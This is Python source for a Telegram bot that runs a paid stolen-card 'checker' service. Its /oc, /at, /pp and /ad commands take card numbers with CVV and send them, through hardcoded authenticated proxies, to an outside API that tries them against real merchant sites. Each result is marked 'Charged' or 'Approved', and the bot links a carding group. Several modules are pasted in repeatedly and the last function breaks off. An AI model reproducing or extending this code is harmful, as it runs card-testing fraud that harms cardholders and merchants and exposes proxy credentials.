from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
import re

logger = logging.getLogger(__name__)

# --- HC Processor ---
async def process_oc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /oc command: check Ocean Payments charge, display response and BIN info.
    Gateway label = Ocean Payments, Price = 4$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: `/oc 1234567812345678|12|2028|123`",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙊𝙘𝙚𝙖𝙣 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨 $𝟰</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"https://rockyog.onrender.com/index.php"
            f"?site=https://arabellahair.com"
            f"&cc={full_card}"
            f"&gateway=ocean"
            f"&proxy=107.172.163.27:6543:fvbysspi:bsbh3trstb1c"
        )

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ Approved"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙊𝙘𝙚𝙖𝙣 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨 $𝟰\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /oc")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass





import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
OC_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def oc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = OC_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = OC_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload, show usage ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/oc card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Pad month → 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_oc(update, context, payload))






import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- HC Processor ---
import aiohttp
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# --- Config ---
AUTOSH_AT_API = "https://rockyog.onrender.com/index.php"
DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
AUTHNET_DEFAULT_SITE = "https://upperlimitsupplements.com"


async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /at command: check AuthNet card, display response and BIN info.
    Gateway label = AuthNet, Price = 2.5$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /at 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝘼𝘶𝘵𝘩𝙉𝙚𝙩 𝟭$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"{AUTOSH_AT_API}"
            f"?site={AUTHNET_DEFAULT_SITE}"
            f"&cc={full_card}"
            f"&proxy={DEFAULT_PROXY}"
        )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ Approved"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝘼𝘶𝘵𝘩𝙉𝙚𝙩 𝟭$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /at")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass




import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
AT_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = AT_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = AT_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/at card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Pad month → 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_at(update, context, payload))





import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

# --- HC Processor ---
import aiohttp
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# --- Config ---
AUTOSH_AT_API = "https://rockyog.onrender.com/index.php"
DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
AUTHNET_DEFAULT_SITE = "https://store.wikimedia.org"


async def process_py(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /pp command: check PayPal-like gateway, display response and BIN info.
    Gateway label = PayPal, Price = 9$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /pp 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝙋𝙖𝙮𝙋𝙖𝙡 𝟵$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"{AUTOSH_AT_API}"
            f"?site={AUTHNET_DEFAULT_SITE}"
            f"&cc={full_card}"
            f"&proxy={DEFAULT_PROXY}"
        )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response safely ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")
        gateway = "PayPal"
        price = "9$"

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester and Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine header status + emojis ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ Approved"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        import time
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝙋𝙖𝙮𝙋𝙖𝙡 𝟵$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /pp")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass







import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
PY_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def py_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = PY_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = PY_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no payload ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/py card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)                      # Ensure month is 2 digits
    yy = yy[-2:] if len(yy) == 4 else yy  # Convert YYYY → YY
    payload = f"{card}|{mm}|{yy}|{cvv}"

    # --- Run in background ---
    asyncio.create_task(process_py(update, context, payload))







import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

# Import DB helpers
from db import get_user, update_user

logger = logging.getLogger(__name__)

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    """Prevent spam by enforcing a cooldown per user."""
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True


# --- HC Processor ---
import aiohttp
import json
import re
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info

logger = logging.getLogger(__name__)

# --- Config ---
ADYEN_API = "https://rockyog.onrender.com/index.php"
DEFAULT_PROXY = "154.203.43.247:5536:fvbysspi:bsbh3trstb1c"
ADYEN_DEFAULT_SITE = "https://pizazzhair.com"

async def consume_credit(user_id: int) -> bool:
    """Consume 1 credit from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

async def process_ad(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /ad command: check Adyen card, display response and BIN info.
    Gateway label = Adyen, Price = 1$
    """
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        # --- Consume credit ---
        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don’t have enough credits left.")
            return

        # --- Extract card details ---
        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: /ad 1234567812345678|12|2028|123",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = html.escape(full_card)

        # --- Clickable bullet ---
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        # --- Initial processing message ---
        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝘼𝙙𝙮𝙚𝙣 𝟭$</b>\n"
        )

        processing_msg = await update.message.reply_text(
            processing_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        # --- API request ---
        api_url = (
            f"{ADYEN_API}"
            f"?site={ADYEN_DEFAULT_SITE}"
            f"&cc={full_card}"
            f"&proxy={DEFAULT_PROXY}"
        )

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                    api_response = await resp.text()
        except asyncio.TimeoutError:
            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
            return
        except Exception as e:
            await processing_msg.edit_text(
                f"❌ API request failed: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Parse API response ---
        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            logger.error(f"API returned invalid JSON: {api_response[:300]}")
            await processing_msg.edit_text(
                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
                parse_mode=ParseMode.HTML
            )
            return

        response = data.get("Response", "Unknown")
        gateway = "Adyen"
        price = "1$"

        # --- BIN lookup safely ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- Requester & Developer ---
        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # --- Determine response emojis + header ---
        display_response = escape(response)
        header_status = "❌ Declined"

        if re.search(r"\b(Thank You|ORDER_PLACED|approved|charged|success)\b", response, re.I):
            display_response += " ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
            header_status = "🔥 Charged"
        elif "3D_AUTHENTICATION" in response.upper():
            display_response += " 🔒"
            header_status = "✅ Approved"
        elif any(x in response.upper() for x in ["INCORRECT_CVC", "INSUFFICIENT_FUNDS", "INCORRECT_ZIP"]):
            header_status = "✅ Approved"
        elif "CARD_DECLINED" in response.upper():
            header_status = "❌ Declined"

        # --- Time elapsed ---
        elapsed_time = round(time.time() - start_time, 2)

        # --- Final formatted message ---
        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n"
            f"⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝘼𝙙𝙮𝙚𝙣 𝟭$\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>"
            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}"
            f"</pre>\n\n"
            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception as e:
        logger.exception("Error in processing /ad")
        try:
            if processing_msg:
                await processing_msg.edit_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(
                    f"❌ Error: <code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass


import re
import asyncio
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Flexible regex: supports |, /, :, or spaces as separators
AD_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def ad_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # --- Cooldown check ---
    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    # --- Check arguments first ---
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = AD_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()

    # --- If no args, check reply message ---
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = AD_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    # --- If still no card input ---
    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/ad card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Normalize format ---
    card, mm, yy, cvv = card_input
